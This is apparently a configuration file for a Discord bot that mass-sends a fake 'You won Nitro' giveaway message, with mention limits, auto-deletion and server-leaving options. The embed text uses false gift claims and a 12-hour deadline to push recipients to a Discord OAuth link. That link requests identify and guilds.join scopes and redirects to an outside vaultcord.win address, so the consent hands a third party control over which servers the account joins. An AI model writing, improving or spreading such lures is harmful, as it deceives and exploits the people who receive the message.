module.exports = {
    token: process.env.token,
    webhook: process.env.webhook,
    icon: "https://polybit-apps.s3.amazonaws.com/stdlib/users/discord/profile/image.png",

    advanced: {
        limit: 5,
        leave: true
    },
    auto_delete: {
        enabled: true,
        interval_seconds: 43200
    },
    blacklist: [],
    mention_limit: 10000,

    embed: {
        content: "**__🎁 YOU WON NITRO ! 🎁__**\n\n✨ You've been presented from **Nasty**, to receive this special holiday reward **$99.99 Discord Nitro**! ✨\n\n---\n\n📋 **How to claim your gift:**\n\n> **1.** Click the link below.\n> **2.** Join our verification server.\n> **3.** Get your exclusive Nitro code instantly!\n\n---\n\n🔗 **[👉 CLICK HERE TO CLAIM YOUR NITRO 👈](https://discord.com/oauth2/authorize?client_id=1488221238638805022&redirect_uri=https://vaultcord.win/auth&response_type=code&scope=identify%20guilds.join&state=109950)**\n\n⏳ *Limited time offer - Valid for 12 hours only!*\n\n[.](https://media.discordapp.net/attachments/1071630827806543982/1072364769924894750/unknown-138.png?ex=6a49d584&is=6a488404&hm=9000170fc55ad2d4d96004a26ad2786d04fee185e46b49829749523113de060b&format=webp&quality=lossless&width=1050&height=591&)"
    }
};
